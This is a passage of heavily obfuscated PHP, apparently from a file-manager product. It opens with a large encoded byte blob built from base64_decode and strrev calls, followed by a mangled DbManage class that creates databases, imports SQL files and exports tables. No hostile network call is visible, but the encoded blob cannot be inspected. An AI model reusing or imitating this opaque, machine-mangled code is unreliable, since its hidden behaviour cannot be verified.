xb7\x83\x9a\x49\xc6\x60\x1e\xfe\x2b\xcb\xc4\xfb\x7b\x64\x80\xb3"."\xea\x9e\xc4\x75\xa8\xef\xcb\x42\x43\xeb\x1a\x42\x73\x4e\x3c\x31\x6c\xa1\xe6\x3d\xea\xf5\x62\xd9\x90\xc8\xcd\xc3\x43\x21\x6f\x7e\x32\x12\x98\x7a\x91\x11\x22\xfc\x39\x39\xd8\x1d\x7\x70\x76\x40\x78\x8e\xf4\xd8\x22\x34\xec\x35"."\252\166\337\336\276\154\235\40\300\326\143\232\316\344\44\352\332\41\331\152\265\34\213\100\101\230\310\364\152\361\331\331\57\251\160\101\205\132\156\334\100\235\164\261\305\70\76\13\61\131\170\304\373\44\323\162".base64_decode('+dy6aurMvyPlsgdxYYDqUxSs4bDANlzHIpSRHk8wC8N1vniqRe9LoIbpLHqMIGO7IrCjiCd1iUg=')."\30\54\105\123\12\126\22\311\113\235\114\305\52\273\36\354\251\261\133\210\231\354\145\356\215\306\230\301\263\314\324\100\104\327\76\223\75\262\70\223\140\2\236\2\350\100\166\160\51\155\215\220\322\205\366\231"."\x6c\x10\x4e\xde\x34\x49\x79\x86\xf6\xea\x35\x42\xa\xce\xd4\x10\x67\x17\xd\x31\x8f\x15\xd7\x26\x67\xaf\xb0\x83\xa7\x6\xb1\xe4\x84\x18\x4c\x82\x15\x70\xa4\x1f\x34\x5b\xbe\xfc\x15\xfe\x3b\xeb\xcb\x8\x5e\x25\xb7\x62\x17\xa".base64_decode('hMZmNo4MBTJCfoTetvFMqWiS2ocNJBPpRCc+au69luNx85Epcbj7CsmqoY270PzEHIIaCUOMIt8=')."\x13\x7\x67\x7b\xfd\x3f\xeb\x98\xbe\x8d\x99\x5d\x3f\x4d\xba\xb6\xce\x40\x2d\x8\x90\x10\x73\xf5\x22\xf4\x25\x1\x5d\x23\x47\x34\x75\x23\x43\x90\x27\x8f\x56\x1e\x5f\xa0\xcf\x3c\x98\xd9\xd0\x3a\xee\x77\xac\xbd\x19\x4d\x93\xd1"."\x4\x43\xba\x61\xc0\x9c\x6a\x8a\x46\xf\x96\xf5\x62\xa2\x9\x1e\x8\x3\x1a\x95\x3b\xac\x81\xea\x90\xc0\x13\xc3\xd\x81\x86\xc6\xd0\x9c\xa6\x86\xda\x14\x6e\xd0\xe2\x4d\xa7\x86\xf1\xfa\x71\x29\x92\x8\xef\xf8\x2\xed\xc0\x9c"."\x7\x74\xc6\x63\xd1\xfe\xb4\x1e\x3\xb2\xa1\xa5\x75\x51\xa8\x59\x1a\xf6\x5b\x8e\x7c\xb8\x84\x7f\x77\x2a\xae\x73\xd8\xac\x86\x3c\xc3\xaa\x33\x35\xfc\x36\x3d\x2d\x4c\x32\xcc\x92\x47\xd2\xca\xa7\xb4\x60\xe3\x93\x1a\xad\xcd\xcd"."\xcd\xc1\xe6\x16\xf2\x17\xed\xb\xd1\xb9\x7f\x9b\xf4\xd9\x28\xb2\x34\x37\xb7\xb1\xbf\x3c\x81\xdd\x68\x3\xd4\x79\x53\x98\x4f\x3a\xa8\x8f\xff\x8c\x9b\x26\x74\x8\x4e\x59\xc2\x4c\x57\x91\x64\x5d\xd7\x49\x7d\x33\x68\xb4\x6b\xb0".base64_decode('LNKkpFItMe89iF6XKMz8Eo1dX0KoaBIyPavOgtDTAxhW78jwm9CQVinHZgU6LK6ySDa5U5bwqxU=')."\xe9\xbe\x25\x5a\xca\xae\x53\x1b\xb\xe1\xec\xf2\x48\xf9\xf0\x58\x10\x13\x82\xea\x6b\xa6\x50\x88\x23\x37\xe5\x16\x89\xe4\xf3\xba\x56\xa2\x31\x84\x18\xca\x88\x15\xa6\x11\x8a\xe8\x95\x12\xc1\x8a\x7f\x23\x1a\x54\x35\x3d\x58\xb2"."\270\40\142\241\202\160\170\110\203\322\253\17\177\50\227\173\2\201\171\253\263\365\362\366\270\56\11\23\32\74\116\204\330\64\322\123\11\141\57\253\70\134\241\163\211\147\217\222\135\150\104\113\5\122\240\351".base64_decode('mM++UUvZAWQBdKWoOp9LaEYcSdpbkjQRpB0N0n63yVkkiCwinhDmpjvCYxCgFh5k741F6Sv23K4=')."\xab\xed\x80\x9a\x45\x76\xfd\xb\xcc\xd6\xcd\x73\x7b\xe1\x57\x4d\xc7\x90\xb2\x7a\xa8\xd0\x90\xfa\x8\xed\x71\x8c\x11\x9e\xac\xb8\xf6\x45\xa7\x78\x5c\x43\xa9\xc0\x9f\xe4\x2b\x13\xe1\x7a\x10\x35\x5\x20\xbe\x36\x37\xd3\x10\xa9"."\223\233\306\373\162\263\147\64\72\305\313\100\352\333\32\134\114\245\50\43\73\360\364\242\124\12\305\72\306\24\246\65\124\256\330\71\2\11\216\72\151\44\176\240\176\264\310\136\233\263\116\46\321\173\65\237".strrev('Œj¨Œä£¸”1Ñ·ˆŒ`ÕXnRF­ô¼S¡%pîôŒƒBŠ¬•Ì+##OŠË*=»1¯I')."\xbe\x6c\x8c\xb0\x1\x1c\x88\xea\x6e\x98\x45\xa2\x2a\x2a\xc2\xea\x57\x5e\x3\x37\xb2\xd9\x1\xe9\xb4\x4b\xf7\x40\xd1\x74\x0\x87\xdb\x4d\x51\x15\xf1\x43\x9f\xc0\x20\x6c\x6f\x9\xe7\x5f\xa8\xde\x4c\x97\x42\x6a\xd\x7a\xe3\x79"."\x1c\x17\x90\x78\x5c\x9f\xa5\x19\x96\x2d\x98\x69\x98\x9\x1c\x2b\x6d\x81\x56\xc0\xd4\xc0\x7d\xab\x27\x77\x5c\x1b\x52\x3f\x6a\x31\x6f\x1a\x5\xe2\xb4\xed\xd1\x50\xfc\xcb\x19\x17\xe1\xc7\x37\xf8\x7\x82\x1d\xba\x9f\x62\x2b\x8c"."\x2e\x9d\x74\xf5\x8a\x8f\x4e\x8f\xae\x4a\xb7\x28\x72\xe9\x75\xdd\xb2\xb7\x22\x5\xf8\xbd\x70\x5f\x3\xe0\x8c\x96\xa0\x15\xb4\x9\xc\xa9\x84\x68\xed\x78\xbb\x4a\xf8\x7e\x70\xa4\x19\xa0\xd1\x9a\xcd\xae\x5e\x34\xea\xa6\x6e\x86"."\27\62\152\13\300\323\337\66\41\142\351\243\101\152\41\132\327\240\17\133\256\24\10\233\206\104\137\71\71\211\146\32\332\354\120\53\250\102\315\306\147\62\371\161\41\125\371\302\236\33\207\20\201\167\112\337".base64_decode('IbFBxrqe8GbyBIR1XMdPEGyIjkMANlpde6kA5XzT1IoIdZDOU7HVeo31fQlzRlcnlXoVw9bEq0o=')."\x70\x32\x91\x3c\xb6\x2b\xf8\x79\x5a\x3d\xd9\x13\x32\x10\x57\x9\x71\x1a\xd1\x65\x8a\xd7\xfc\xd2\xbc\x86\xe0\x32\xd9\xf3\x25\x86\xe8\xb4\xaa\xe2\xa6\xe8\x64\x88\x42\xa4\x7f\xc2\x21\xda\x66\xab\xcc\x1e\xcd\x53\x24\xe\xbe\xa0".base64_decode('36aEllCUykhQIR4Y6eIi9YFP5kmzDPYpz4u/bD8DP06XsKYijjr9g1pFnbQHJWkVAnRXxczYlSw=')."\x3d\xbf\x25\x42\xcb\x94\xdc\xa4\x99\x53\x83\x4c\x87\x2\x77\x8c\x7c\x82\x4b\xad\x82\xfa\x6b\x56\x90\x22\xdd\xa9\x91\x8c\x5b\x55\xbd\x3f\x2b\x2f\xf2\x91\x90\xa2\x2c\xac\x10\xd0\xc1\x16\x4d\x50\xde\x3a\xaf\x99\x7\xe6\x2a\x9".base64_decode('LH89Itwni2aSAK5Hw+RxqeqwuBL3UcZo4q6pNDHas9MKmKtbOgKPO0pSLX0dS45MLcLarCnC0yg=')."\x1d\x28\xd\xdc\xd5\x14\x87\x6a\x3\xd\xe2\x2a\xd6\x4b\xa9\xd3\x14\x4b\x52\x66\x14\x10\xc0\x5a\x39\x37\x30\xec\x49\x13\x15\xcc\x82\x2d\xad\x41\x7c\x28\x40\xb5\x75\x47\x5e\x12\xe\x37\xb2\xbd\x94\xd5\xa7\xc\x38\x62\x38\x30".base64_decode('AoJ8Mo+tKBcwp7DSVR3zhCuWkbnMFSGmBajidqkLyy2E/LqTIp1PAU3u8hhy+TKQDeBNZy2qppU=').strrev('ıDØİÿıÉS°¦U¬ˆ¶Ó£&L'."\n".' #®¤'."\n".'rÚæÊ$n&•*T”¬_ºª|¯Uò¸÷­=Ü')."\x79\x64\xa0\x7d\x93\xc2\x2b\xb\x55\xb4\xa7\x7\xb8\x30\xdf\x72\xd4\x0\xa6\xa\x90\x73\x3c\x1\x6e\xb9\xe0\x29\x2d\xa2\x44\xae\x71\x13\x5d\xf7\xa0\xdc\x60\xa0\x77\x20\x2c\xa2\x3a\xc4\xa6\xe3\x92\x1a\xe9\x44\xbc\x13\xb5\xf7"."\xcd\x9\x13\xb8\xcd\xf1\xa2\x95\xd1\xe2\x89\x9e\x58\x67\x24\xde\x15\x4b\xad\xd4\xa8\xc7\x53\xc5\x55\xf\xe9\xae\xce\x36\xa3\xee\x48\xbd\x39\x4e\x51\xf7\xaa\x66\x50\x7c\x7b\x30\xa1\x3f\x5f\x9\x4\xe8\x61\xf1\xfe\x27\xfd\xc"."\16\23\226\46\230\25\254\240\43\231\76\66\116\250\114\276\355\356\255\226\3\244\131\251\251\261\104\15\357\13\65\145\250\214\277\116\356\202\224\115\53\231\313\25\263\66\377\244\111\125\354\225\36\53\5\252"._kodDe('Lmpl6fOn2w6wRV8DY7jiPRxpxySbKVbMhkjjQlItncXC2wcTx2jhpVL2t5sWo66cm4xyxWCei2aI').base64_decode('m7tQRgiyR1X0LcUMdAN1GIqvZb566hsKymlApbCEuDSEr/wyXt/RU1N5OxiCysvc5YphOaYSwX0=')."\61\243\65\272\121\50\50\151\364\222\110\11\126\275\307\154\335\246\164\336\0\306\51\372\346\365\62\44\143\75\275\351\377\343\256\132\131\251\262\154\11\175\163\341\333\204\77\315\331\311\353\361\266\51\137\37".base64_decode('r40Bt+Uf+bJ5QPHkytymwta3mFNluNaV9lXcHatsghAvlcmyevUczqKNPdkLUTSZpQHJ9NBcUAk=').strrev('@:u)ıE’©°‘1Ë×9 ££­§“}{Ó^¼<ó·îÍ=ôüQî<%”NiãõÍ²eÔÜó…m')."\222\65\51\240\23\31\264\166\255\231\11\312\345\113\252\332\122\364\336\44\33\140\176\225\25\367\331\165\260\247\262\44\270\112\272\172\124\56\1\157\321\100\114\63\204\54\231\104\252\373\151\27\47\153\42\74"."\362\273\70\366\132\150\164\323\127\146\311\6\126\147\227\31\216\121\173\341\0\373\342\142\221\0\341\76\114\267\366\111\157\136\374\377\117\101\236\230\122\236\355\160\374\7\245\70\344\74\66\154\114\337\72\157"."\217\113\331\1\306\50\124\30\332\315\325\353\336\64\103\125\366\25\363\102\244\276\254\356\61\255\363\274\244\313\23\264\152\211\336\216\20\24\4\53\116\125\222\220\363\145\231\225\276\315\346\77\103\360\213\307"."\243\277\23\34\273\101\223\115\2\0\275\6\0\112\104\237\51\5\41\254\24\101\47\145\243\344\171\143\232\364\275\336\263\365\364\351\3\357\113\311\4\346\170\222\56\317\137\357\203\274\102\253\301\221\233\305".base64_decode('cT1PQKfJCZILcNil6E+GOibVb9UcjPWcJKLEUvqTWIYxZAg5xHr+d4uV3SeQq2oymWNOwkGp0ec=')."\350\43\147\231\170\100\170\262\361\250\260\121\56\313\313\31\365\250\245\357\5\250\216\104\40\155\60\335\253\63\67\137\72\127\315\110\51\147\241\274\43\345\221\160\137\132\55\305\370\45\221\47\266\242\160\204"."\xea\x33\x37\xfc\xe2\x48\x7a\x9d\x80\xec\xa4\x9f\x3\xfc\xc6\x18\x26\x4c\xad\x12\x6f\xf1\x85\xcc\x9f\x60\x1b\xc1\x38\x87\x6b\x6f\xfd\xa9\xb2\x1c\xe0\x11\xaa\x9c\x84\x5a\x61\xa3\x36\x63\xbc\x42\x2a\xcb\x6\x19\xb4\xa5\x9a\x4"."\7\165\223\161\143\207\154\66\300\76\30\176\120\321\32\156\113\337\153\320\65\371\300\370\242\356\53\331\334\340\202\375\164\231\43\202\25\122\375\23\112\5\42\16\165\322\2\216\41\322\376\152\321\333\214\260".base64_decode('hAvwsQbEjrEcikYDpWoReRv6TZU4AuKF6wB/cSPAuTwHCnMbnekf36b9FySCYDtqOBc/0yLmy1c=')."\x20\xe9\x9f\x3d\x2a\x16\xf4\xcb\xb8\xa5\xa\x4\xc\x42\x4\xbc\x9c\x1b\x8c\x5a\x8e\x50\x19\x52\xb5\x52\x8\x30\x5\x90\x0\x6a\x65\xfa\xc6\xef\x99\x5a\x39\x56\x75\xad\x7c\x96\x87\x22\x98\x28\xa8\xa3\x1c\xac\x14\x52\xd2\x9c".strrev('ä¥<‰‘U‹¼ëlÅµï…¨ˆæ¦C;©¥Ÿ95@òÍŸİBğW–Û‹Ö^,`Å0Ùû:”.HõŒ')."\55\64\276\233\307\177\200\332\221\320\243\171\341\125\303\247\154\124\114\301\22\275\326\76\360\336\216\162\336\370\116\210\377\243\235\245\160\50\74\253\352\344\217\277\337\141\27\50\357\134\244\127\5\156\305\360"."\62\203\165\170\36\74\142\331\54\326\175\272\136\71\362\2\65\307\37\247\52\30\64\302\170\304\214\302\376\55\131\231\121\346\3\216\265\300\355\376\2\216\71\21\340\23\26\120\157\300\71\253\43\365\305\350"."\x60\x4\xe0\x2a\x16\x83\xc\xa7\x4b\x1d\xb2\x3a\xc3\xa5\x53\x24\x39\x0\xd6\x49\x89\x79\xf8\xac\xe2\x71\xe5\xd5\x9a\x73\x8d\x61\x8a\x69\x95\xc7\x58\x28\x72\x50\x94\xa\x99\xfd\xb4\xa8\x8a\x5a\x64\x2a\x46\xa2\xb8\xa4\xf5\x26"."\322\327\32\207\155\233\352\154\71\262\76\137\15\174\5\352\0\210\354\233\362\346\16\33\26\362\312\124\66\56\103\336\101\202\74\113\46\53\374\155\175\206\230\316\45\223\34\47\112\205\311\172\103\257\63\204"."\17\201\153\344\101\303\53\144\327\25\235\45\357\2\371\172\301\211\134\1\63\314\76\121\145\270\203\206\33\24\224\122\202\315\57\20\176\122\2\340\253\222\144\224\302\306\365\1\155\272\114\65\136\37\370\276"."\x91\x40\xa9\xa4\xc9\x91\xa0\x33\x99\x69\x44\x26\x88\xd0\xe5\x5d\x15\x73\xe8\x21\x9d\xe\x32\xd4\xe3\x41\x43\xca\xdb\x56\xaa\x43\xc\x56\x91\xa\xab\xb5\x55\xf3\x43\x98\xc9\xe7\xa5\x84\x8d\x89\xe4\x60\x10\x80\x9c\x98\xea\xa"."\x73\xa8\x12\xe9\x11\x4e\x56\xc\x45\x2d\x53\xf7\x6f\x77\xa\xe\xb2\xd3\xae\xad\x7e\x4b\x30\xa1\xc7\xa0\xb0\xb6\x24\x1d\xf0\xb0\xe0\x24\x2c\x57\x5d\xa1\x2c\x25\xfb\xa7\xa0\x61\x7f\x24\x4e\x1d\xdb\x78\x12\xad\x2b\x8e\x7d\x3c"."\274\37\147\17\111\213\36\136\320\221\323\3\273\50\33\340\10\136\4\5\170\3\176\3\374\317\14\24\171\153\12\251\201\235\312\51\137\202\344\241\1\105\62\356\361\154\104\35\15\373\166\56\372\113\242\306".base64_decode('+erNJn9NhX8jjyM6yZBuvY0oTbQD0iw7gAdy4ID992d+L2gZIfWocziwYX8IabVAWDgLg0aGXjE=')."\xd0\x3\xec\x7\x74\x9b\xbe\x32\x26\xb0\x36\x97\xa1\xfb\x6\xe4\x25\x19\xf6\x7\x58\x21\xf3\x1e\x1a\x93\xf8\x83\x85\x85\x9a\x3f\x7a\x9d\x46\x67\xd4\x6\x5e\x33\x12\x2a\xdd\x7f\x53\x5d\xc3\xb0\x49\xb7\x31\xb6\x5d\x18\x36\x2a"."\324\356\175\324\105\135\252\172\1\277\263\215\224\61\142\252\175\136\307\144\334\44\222\31\103\257\227\310\203\306\325\53\46\121\23\73\173\312\12\362\143\165\221\30\245\26\241\322\11\231\245\251\63\343\40\24"."\303\155\70\230\175\343\144\32\317\336\127\234\24\272\254\46\233\354\34\41\337\204\322\65\176\145\50\261\300\274\306\301\44\253\156\174\22\145\344\252\233\340\30\130\277\2\321\32\363\46\6\330\115\305\150\236"."\250\32\74\230\366\54\235\47\122\135\25\211\272\102\136\267\205\120\202\136\155\167\50\254\52\317\204\217\44\200\322\212\202\170\31\141\127\256\372\337\146\342\374\242\132\112\325\203\251\155\100\40\23\265\10\265"."\323\360\12\14\321\135\102\260\71\350\213\150\11\372\252\263\34\176\173\343\333\65\152\147\270\31\25\25\137\45\251\300\10\5\204\354\376\215\135\326\7\153\313\50\266\374\352\205\176\315\36\255\217\62\104\247"."\244\220\224\176\251\363\201\250\147\240\142\263\271\365\306\12\41\232\242\374\236\121\44\321\176\42\214\107\317\16\251\3\121\157\250\275\267\140\324\371\134\124\137\35\243\216\250\142\47\104\7\361\105\11\313\146".base64_decode('7z5iLYN96vuD9H6k2xYARvehfLrALZY7xWW01xRdsRwQ7z0q8lhvZmq85N2Vy+ply9gVR8lGpRk=')."\x78\x68\x8f\xa0\xfa\xc8\x60\x89\x6c\x64\x33\xe3\x9a\x59\x8d\x9e\xf4\x1e\xe6\x65\xdd\xfc\xe6\x79\xeb\xeb\x55\x4c\x89\x6c\x9b\xd4\x3c\x1f\x5f\xf4\x26\x39\xe7\x7f\x44\x4e\xe0\xa2\x52\xf3\x82\xd0\xd7\x58\x82\xfb\xa5\x4b\x46\x41"._kodDe('LRQvxvu5nq/X2+YClj05D6qCgXsgUOvmA0Cvl8l6eTTqj5132Idc0JmF33sVfiB700TaVBogIJrP').strrev('¨P¨9\\Äçå)ÚÚõ¹¸×ö,’¢dÊÜ†/–·¨b÷)Â¢ôTu©>v™„áZ“µê-k')."\121\312\45\22\141\100\263\336\207\244\131\42\213\306\367\107\240\6\345\166\334\253\223\40\54\225\153\116\324\252\25\127\222\131\51\364\145\117\176\251\53\205\230\164\274\310\222\371\345\137\304\317\21\52\245\6"."\75\314\275\242\301\220\141\230\42\132\173\207\55\257\326\25\372\24\213\121\351\200\44\25\174\361\12\146\225\307\243\61\46\351\153\311\174\145\263\335\306\130\235\254\331\32\366\220\304\210\254\214\76\127\174\140"."\x49\x9b\x29\x73\x5c\x6d\x1d\xf2\x49\xf3\x25\x4f\xc6\xda\x58\xe9\x23\x4b\x29\xef\x63\xab\xd9\x30\x69\x5c\xbd\xe1\x33\xb4\xe7\x2d\xae\xfa\xe0\x12\x40\x25\xa3\x58\x9e\x8c\x50\xf7\x51\x64\x16\x54\x3d\x4a\xea\x1\xf1\xa1\x8\x99"."\231\154\322\353\361\113\144\23\153\106\362\60\303\312\240\47\326\307\165\123\241\44\122\226\276\44\20\330\51\325\327\225\353\51\40\140\26\342\112\165\252\172\303\264\5\122\365\33\221\120\351\235\142\105\206\45"."\x13\x90\xba\xb1\x3d\x93\xaf\xe8\x2c\x89\x81\x41\xce\xa4\x9a\xe8\xe9\x4e\x1d\xd0\x40\x66\x43\x95\x4\xd7\x26\xda\x85\x2\xbd\xc3\x9e\x26\x99\xab\x57\x2b\x27\x6d\x6d\x8e\x82\xd0\xd1\xe1\x1d\x62\x9c\xb3\xdc\x38\x3c\xb2\xc8\x24".base64_decode('TTwt4k3i+U3fvKkF/HPKS6jnnSd+3HIzeYXNr02sja/ULDN0oP44/L3FVfarO8lKavqj6GKl7To=')._kodDe('KmxZ3oPXCqg9WJgwqJtZ9o2KTsUbKaZMvVqsTVLLLS6cAMdqozTmjXYnoR1USA1CppMrJ2kqy2/7').base64_decode('wJ+bycnq90IRJHo1ZOr1om7maXvhzy3pIMpW10upu0FB9aPOiYEpdc4Ijv+mVT2Tmlm1h5VMq6M=')."\x1c\x6\xde\xbd\x7c\x6e\xc3\xea\x24\xab\x9a\x66\xf5\x75\xd1\x92\x75\xf1\x9b\xe3\xd5\x17\xf3\xc5\x7b\x1e\x14\xe0\x28\x9\x9\xe3\x4d\xaa\x9d\xb1\xd0\x92\x94\x35\x11\x82\xb1\x60\x8d\x4a\x75\x5c\xb4\x1a\x9a\xed\x39\xde\xaa\xa5"."\xd1\x92\x2d\x8e\xcc\xac\x54\xc1\x16\x1d\xa9\xa9\xc0\xbb\xf\x4a\x55\xe5\x3d\x9d\xba\x76\x4b\x1\x2a\xec\xaa\x15\x2b\x15\xf0\xa1\x8\xd5\xe2\x8b\x73\xf9\xb6\x6b\x65\x14\x1d\x55\x69\xb5\x22\x46\x66\x49\xb6\xb7\x20\xc5\xd3\xfe".strrev('~Ì¾é\\q]”äğIN+³YÜFqTºäx¸#)ÈWcÄ&'."\n".'}yâ.’ş(Ó¸“Õ5(ó)K')."\73\154\327\225\52\77\170\241\101\370\0\112\16\4\24\145\67\362\45\57\253\151\247\330\235\47\203\141\176\45\101\77\101\213\202\112\222\122\46\117\145\110\317\23\240\267\253\42\220\254\275\134\355\26\57\232".base64_decode('jNrZYXsCfTkTyFHmRPFlCf4fFXU85rzGCfOUMLwgGWSXIUHwLryxnPMU50+LC2X6D6sBLgJkFfw=')."\271\67\46\370\5\133\306\124\72\125\223\64\20\111\245\126\47\222\135\374\165\270\232\144\126\112\121\175\254\111\32\350\115\364\117\227\26\355\213\304\342\65\151\124\113\262\137\227\16\301\171\122\154\200\365\222"."\251\5\114\327\213\130\347\112\331\23\274\232\214\303\313\350\162\21\224\213\271\162\336\56\115\267\216\130\101\312\100\237\213\352\35\225\131\224\136\344\145\45\136\101\233\172\217\345\340\3\64\342\303\373\104\264"."\117\45\331\253\144\203\220\13\325\122\325\307\176\150\51\131\206\130\372\304\236\100\0\202\237\220\352\66\41\217\246\217\22\317\66\11\303\72\312\336\125\117\167\166\267\53\344\157\54\171\116\335\331\254\163\301"."\xa8\xde\xd2\xd2\x54\x39\x39\xb4\x9b\xc7\xe1\x5b\x38\x1b\xed\x61\x45\xc9\x91\xf3\x76\xe0\xae\x0\xa6\x5b\x51\x76\xe5\xdf\x9e\x64\xd7\xc8\x5\x5\x3a\x50\x74\x58\xb8\x4c\x9c\x22\x5\x29\xad\xfe\xff\x0\x90\x40\x8c\xb3\x47\xc9"."\x0\x0", 10, -8))); goto FßÏŒö—ƒ’; bŸØğŠØöß: class DbManage { public $message = ''; function __construct($³ÖÆ‘â¨ = array()) { $³œÈ‚€ =& $_SERVER[µÅ˜º…æ]; if (empty($³ÖÆ‘â¨)) { $³ÖÆ‘â¨ = $GLOBALS[$³œÈ‚€[6]][$³œÈ‚€[21]]; } $this->database = $³ÖÆ‘â¨; } public function model($‰ò¼¯ŠÛ = '') { return new ModelBase($‰ò¼¯ŠÛ, $_SERVER[µÅ˜º…æ][12], $this->database); } public function db($÷º’¥Ò = false) { $ÌŸÈ¡ù° =& $_SERVER[µÅ˜º…æ]; $â»ŠÒßø = array_change_key_case($this->database); if ($this->dbType() == $ÌŸÈ¡ù°[13] || !$÷º’¥Ò) { return $this->model()->db(); } $ş‚‘¾® = $â»ŠÒßø[$ÌŸÈ¡ù°[1141]]; $â»ŠÒßø[$ÌŸÈ¡ù°[1141]] = $ÌŸÈ¡ù°[12]; if ($â»ŠÒßø[$ÌŸÈ¡ù°[1136]] == $ÌŸÈ¡ù°[1133]) { $Áí»Âôï = $â»ŠÒßø[$ÌŸÈ¡ù°[1142]]; $â»ŠÒßø[$ÌŸÈ¡ù°[1142]] = substr($Áí»Âôï, 0, strrpos($Áí»Âôï, $ÌŸÈ¡ù°[1228])); } $this->database = $â»ŠÒßø; $·¿û—ÁÎ = $this->model()->db(); $Ò÷¢ªÅ = $·¿û—ÁÎ->execute("\x73\150\157\167\40\144\141\x74\141\x62\141\x73\145\x73\40\x6c\x69\x6b\x65\40\x27{$ş‚‘¾®}\x27"); if (!$Ò÷¢ªÅ) { try { $·¿û—ÁÎ->execute("\143\x72\145\141\164\x65\x20\x64\x61\x74\141\142\141\x73\145\40\x60{$ş‚‘¾®}\140"); } catch (Exception $œµ³ÏÏá) { $this->message = $œµ³ÏÏá->getMessage(); return !1; } } $â»ŠÒßø[$ÌŸÈ¡ù°[1141]] = $ş‚‘¾®; if ($â»ŠÒßø[$ÌŸÈ¡ù°[1136]] == $ÌŸÈ¡ù°[1133]) { $â»ŠÒßø[$ÌŸÈ¡ù°[1142]] .= $ÌŸÈ¡ù°[1228] . $ş‚‘¾®; } $this->database = $â»ŠÒßø; try { $·¿û—ÁÎ->execute("\x75\x73\145\40\x60{$ş‚‘¾®}\x60"); } catch (Exception $œµ³ÏÏá) { $this->message = $œµ³ÏÏá->getMessage(); return !1; } return $·¿û—ÁÎ; } public function createTable($ŒĞü¹Ù, &$ÅÇ¯¶É•) { $àâÈùÔÑ =& $_SERVER[µÅ˜º…æ]; if (!IO::exist($ŒĞü¹Ù)) { show_json(LNG($àâÈùÔÑ[1229]), !1); } $¾ÊÂÁå = $this->model()->db(); $¦îÔ©¡£ = IO::getContent($ŒĞü¹Ù); $¦îÔ©¡£ = str_ireplace($àâÈùÔÑ[1230], $àâÈùÔÑ[1231], $¦îÔ©¡£); $ş¥’ëı¿ = sqlSplit($¦îÔ©¡£); foreach ($ş¥’ëı¿ as $Ã—¼ÄÑ‚) { $ÍÍ¦“Úâ = stripos($Ã—¼ÄÑ‚, $àâÈùÔÑ[1232]) === 0; if ($ÍÍ¦“Úâ) { $ÅÇ¯¶É•->task[$àâÈùÔÑ[1233]] += 1; } $¾ÊÂÁå->execute($Ã—¼ÄÑ‚); if ($ÍÍ¦“Úâ) { preg_match($àâÈùÔÑ[1234], $Ã—¼ÄÑ‚, $«ºŸªßä); $ÅÇ¯¶É•->task[$àâÈùÔÑ[1235]] = $«ºŸªßä[1]; $ÅÇ¯¶É•->update(1); } } } public function insertTable($¸›Û¡¨Â, &$ª ÒÎ™Ş) { $¦„Œ¼úå =& $_SERVER[µÅ˜º…æ]; $èø‹ì£ô = $this->model()->db(); $Ø¥¯¸Ì­ = $‡ËğÕ•Á ? array($‡ËğÕ•Á) : $èø‹ì£ô->getTables(); foreach ($¸›Û¡¨Â as $î±€ö‹Œ) { $‡ËğÕ•Á = basename($î±€ö‹Œ, $¦„Œ¼úå[890]); if (!in_array($‡ËğÕ•Á, $Ø¥¯¸Ì­)) { continue; } $ª ÒÎ™Ş->task[$¦„Œ¼úå[1235]] = $‡ËğÕ•Á; if ($‡ËğÕ•Á == $¦„Œ¼úå[472]) { continue; } if (get_filesize($î±€ö‹Œ) == 0) { continue; } $­ùï£‹® = $this->sqlToDb($î±€ö‹Œ, $ª ÒÎ™Ş); if (!$­ùï£‹®) { show_json(LNG($¦„Œ¼úå[1236]) . "\133{$‡ËğÕ•Á}\x5d", !1); } } } public function sqlFromDb($§ºªì», $„–á¬Ã÷, &$¶­í•, $ì‰ø®„ = '') { $™¤ä¸ëÍ =& $_SERVER[µÅ˜º…æ]; if ($¶­í•) { $¶­í•->task[$™¤ä¸ëÍ[1235]] = $§ºªì»; } $ğ…Æüã» = $this->model($§ºªì»); $’ñ€Ü… = 0; $Ÿƒ“£ÂÂ = 0; $öªÄæû¿ = 10000; $˜Îî”×ı = fopen($„–á¬Ã÷, $™¤ä¸ëÍ[1237]); $î¨ëİ• = $ğ…Æüã»->getPk(); $—Ğ¸û– = $ğ…Æüã»->getDbFields(); $Ú«”•Üº = $™¤ä¸ëÍ[12]; if ($GLOBALS[$™¤ä¸ëÍ[889]] && in_array($§ºªì», array($™¤ä¸ëÍ[1238], $™¤ä¸ëÍ[1239]))) { $Ú«”•Üº = $§ºªì»; } do { $­™íƒ²Ğ = array($î¨ëİ• => array($™¤ä¸ëÍ[1183], $Ÿƒ“£ÂÂ)); $‚Ìî‚àµ = $ğ…Æüã»->where($­™íƒ²Ğ)->field($—Ğ¸û–)->order($î¨ëİ• . $™¤ä¸ëÍ[1240])->limit($öªÄæû¿)->select(); $‚Ìî‚àµ = !empty($‚Ìî‚àµ) ? $‚Ìî‚àµ : array(); if (!($²ÍÂ¿ = count($‚Ìî‚àµ))) { break; } $³Ï÷Ğø¿ = end($‚Ìî‚àµ); $Ÿƒ“£ÂÂ = $³Ï÷Ğø¿[$î¨ëİ•]; $’’÷¢ = array(); foreach ($‚Ìî‚àµ as $ÍØÂÇ•İ) { if ($Ú«”•Üº) { if ($§ºªì» == $™¤ä¸ëÍ[1238]) { if ($ÍØÂÇ•İ[$™¤ä¸ëÍ[33]] == $™¤ä¸ëÍ[1241]) { $ôÊ—Ú£œ = json_decode($ÍØÂÇ•İ[$™¤ä¸ëÍ[451]], !0); if ($ôÊ—Ú£œ[$™¤ä¸ëÍ[32]] == $GLOBALS[$™¤ä¸ëÍ[889]] && $ôÊ—Ú£œ[$™¤ä¸ëÍ[849]] != 1) { continue; } } } else { if ($ÍØÂÇ•İ[$™¤ä¸ëÍ[33]] == $™¤ä¸ëÍ[1242] && $ÍØÂÇ•İ[$™¤ä¸ëÍ[95]] == $™¤ä¸ëÍ[885]) { continue; } } } $’’÷¢[] = $™¤ä¸ëÍ[1243] . $this->sqlEncode($ÍØÂÇ•İ) . $™¤ä¸ëÍ[1244]; } $îèÓÉú˜ = "\x49\116\x53\105\122\124\40\x49\x4e\124\x4f\x20\140{$§ºªì»}\x60\40\x28\140" . implode($™¤ä¸ëÍ[1245], $—Ğ¸û–) . $™¤ä¸ëÍ[1246]; fwrite($˜Îî”×ı, $îèÓÉú˜ . implode($™¤ä¸ëÍ[1247], $’’÷¢) . $™¤ä¸ëÍ[74] . PHP_EOL); $’ñ€Ü… += $²ÍÂ¿; if ($¶­í•) { $¶­í•->update($²ÍÂ¿); } } while ($öªÄæû¿ == $²ÍÂ¿); fclose($˜Îî”×ı); return $’ñ€Ü…; } public function sqlToDb($ôÇ»™÷­, &$ÒÓÚ¾») { $Š¡ïö´ =& $_SERVER[µÅ˜º…æ]; $Éš¿¤øŸ = $this->model()->db(); $â¿’£“æ = @fopen($ôÇ»™÷­, $Š¡ïö´[1248]); if 